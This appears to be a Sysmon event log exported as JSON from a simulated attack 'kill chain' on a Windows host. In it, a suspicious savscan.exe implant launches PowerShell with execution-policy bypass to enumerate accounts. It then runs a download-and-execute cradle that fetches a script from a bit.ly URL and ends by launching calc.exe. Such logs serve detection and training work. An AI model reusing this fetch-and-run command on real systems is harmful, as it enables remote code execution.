{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:55:53.836317"}, "EventRecordID": 28205, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-14 09:55:53.829", "ProcessGuid": "{4e85e66a-5fa9-5f36-d94d-000000004300}", "ProcessId": 17196, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"Get-WmiObject -Class Win32_UserAccount\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597373753.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:55:53.961006"}, "EventRecordID": 28206, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-14 09:55:53.947", "ProcessGuid": "{4e85e66a-5fa9-5f36-d94d-000000004300}", "ProcessId": 17196, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jq0t3eyx.nvd.ps1", "CreationUtcTime": "2020-08-14 09:55:53.947"}, "fields": {"time": 1597373753.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:55:53.976835"}, "EventRecordID": 28207, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-14 09:55:53.951", "ProcessGuid": "{4e85e66a-5fa9-5f36-d94d-000000004300}", "ProcessId": 17196, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cm4u5crf.dzw.psm1", "CreationUtcTime": "2020-08-14 09:55:53.950"}, "fields": {"time": 1597373753.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:55:54.059328"}, "EventRecordID": 28208, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-14 09:55:54.027", "ProcessGuid": "{4e85e66a-5fa9-5f36-d94d-000000004300}", "ProcessId": 17196, "PipeName": "\\PSHost.132418725538297412.17196.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597373754.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:55:54.510275"}, "EventRecordID": 28209, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-14 09:55:54.460", "ProcessGuid": "{4e85e66a-5fa9-5f36-d94d-000000004300}", "ProcessId": 17196, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597373754.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:00.841146"}, "EventRecordID": 28210, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-14 09:56:00.834", "ProcessGuid": "{4e85e66a-5fb0-5f36-da4d-000000004300}", "ProcessId": 15508, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C $env:username", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597373760.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:00.941778"}, "EventRecordID": 28211, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-14 09:56:00.934", "ProcessGuid": "{4e85e66a-5fb0-5f36-da4d-000000004300}", "ProcessId": 15508, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_nkuttewh.cvd.ps1", "CreationUtcTime": "2020-08-14 09:56:00.934"}, "fields": {"time": 1597373760.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:00.953115"}, "EventRecordID": 28212, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-14 09:56:00.937", "ProcessGuid": "{4e85e66a-5fb0-5f36-da4d-000000004300}", "ProcessId": 15508, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_wq45mm3o.lqt.psm1", "CreationUtcTime": "2020-08-14 09:56:00.936"}, "fields": {"time": 1597373760.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:01.032492"}, "EventRecordID": 28213, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-14 09:56:01.009", "ProcessGuid": "{4e85e66a-5fb0-5f36-da4d-000000004300}", "ProcessId": 15508, "PipeName": "\\PSHost.132418725608347581.15508.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597373761.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:01.120811"}, "EventRecordID": 28214, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-14 09:56:01.119", "ProcessGuid": "{4e85e66a-5fb0-5f36-da4d-000000004300}", "ProcessId": 15508, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597373761.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:05.449974"}, "EventRecordID": 28215, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-14 09:56:05.438", "ProcessGuid": "{4e85e66a-5fb5-5f36-db4d-000000004300}", "ProcessId": 15484, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\\\"https://bit.ly/33H0QXi\\\")\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597373765.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:05.741808"}, "EventRecordID": 28216, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-14 09:56:05.682", "ProcessGuid": "{4e85e66a-5fb5-5f36-db4d-000000004300}", "ProcessId": 15484, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_o31fse4o.wkf.ps1", "CreationUtcTime": "2020-08-14 09:56:05.682"}, "fields": {"time": 1597373765.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:05.895927"}, "EventRecordID": 28217, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-14 09:56:05.894", "ProcessGuid": "{4e85e66a-5fb5-5f36-db4d-000000004300}", "ProcessId": 15484, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_qkoelnet.ydw.psm1", "CreationUtcTime": "2020-08-14 09:56:05.894"}, "fields": {"time": 1597373765.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:06.019590"}, "EventRecordID": 28218, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-14 09:56:06.018", "ProcessGuid": "{4e85e66a-5fb5-5f36-db4d-000000004300}", "ProcessId": 15484, "PipeName": "\\PSHost.132418725654386346.15484.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597373766.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:06.819317"}, "EventRecordID": 28219, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16088}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "NetworkConnect include Group", "UtcTime": "2020-08-14 09:56:16.631", "ProcessGuid": "{4e85e66a-100f-5f31-6000-000000004300}", "ProcessId": 3708, "Image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2007.8-0\\MsMpEng.exe", "User": "NT AUTHORITY\\\u0421\u0418\u0421\u0422\u0415\u041c\u0410", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 51348, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "40.115.3.210", "DestinationHostname": "-", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597373766.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:06.819479"}, "EventRecordID": 28220, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16088}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "NetworkConnect include Group", "UtcTime": "2020-08-14 09:56:16.757", "ProcessGuid": "{4e85e66a-100f-5f31-6000-000000004300}", "ProcessId": 3708, "Image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2007.8-0\\MsMpEng.exe", "User": "NT AUTHORITY\\\u0421\u0418\u0421\u0422\u0415\u041c\u0410", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 51349, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "40.115.3.210", "DestinationHostname": "-", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597373766.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:08.571280"}, "EventRecordID": 28221, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16088}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "Info=Powershell Network Connection,suspicious_net_event=True", "UtcTime": "2020-08-14 09:56:18.101", "ProcessGuid": "{4e85e66a-5fb5-5f36-db4d-000000004300}", "ProcessId": 15484, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "QISHNA\\garip", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 51350, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "67.199.248.10", "DestinationHostname": "bit.ly", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597373768.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:08.638939"}, "EventRecordID": 28222, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-14 09:56:08.241", "ProcessGuid": "{4e85e66a-5fb8-5f36-dc4d-000000004300}", "ProcessId": 9204, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c IEX c:\\windows\\system32\\calc.exe", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-5fb5-5f36-db4d-000000004300}", "ParentProcessId": 15484, "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\\\"https://bit.ly/33H0QXi\\\")\""}, "fields": {"time": 1597373768.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:08.755554"}, "EventRecordID": 28223, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-14 09:56:08.731", "ProcessGuid": "{4e85e66a-5fb8-5f36-dc4d-000000004300}", "ProcessId": 9204, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_wclbhuse.rik.ps1", "CreationUtcTime": "2020-08-14 09:56:08.731"}, "fields": {"time": 1597373768.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:08.770298"}, "EventRecordID": 28224, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-14 09:56:08.734", "ProcessGuid": "{4e85e66a-5fb8-5f36-dc4d-000000004300}", "ProcessId": 9204, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xfq1tch3.mbn.psm1", "CreationUtcTime": "2020-08-14 09:56:08.734"}, "fields": {"time": 1597373768.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-14 09:56:08.834242"}, "EventRecordID": 28225, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-14 09:56:08.801", "ProcessGuid": "{4e85e66a-5fb8-5f36-dc4d-000000004300}", "ProcessId": 9204, "PipeName": "\\PSHost.132418725682416062.9204.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597373768.0, "host": "Qishna", "source": "Killchain_logs.evtx"}}
